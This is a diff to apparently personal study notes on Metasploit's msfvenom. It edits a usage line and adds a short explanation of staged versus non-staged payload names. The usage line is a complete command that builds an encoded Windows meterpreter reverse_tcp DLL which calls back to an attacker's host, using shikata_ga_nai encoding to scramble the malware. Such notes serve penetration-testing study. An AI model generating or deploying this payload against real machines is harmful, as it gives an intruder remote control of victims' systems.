@@ -62,4 +62,18 @@ is a combination of msfpayload and masfencode putting these tools into a single 
 shikata_ga_nai is a common encoding type used for scrambling the malware. 
 2
 usage : 
-msfvenom -p windows/meterpreter/reverse_tcp lhost=<your ip>  lport=4444 -e x86/shikata_ga_nai -i 10 -f dll > payload.dll
+msfvenom -p windows/meterpreter/reverse_tcp lhost=**IP**  lport=4444 -e x86/shikata_ga_nai -i 10 -f dll > payload.dll
+
+
+## Payload
+The way to identify if it staged or non-staged payload is by the **/** which indicate the type of payload.
+
+### Staged 
+Sends the payload in stages, can be less stable
+
+example : windows/meterpreter/reverse_tcp
+
+### non-staged 
+Send the full exploit shellcode at once, It larger in size 
+
+example : windows/meterpreter_reverse_tcp
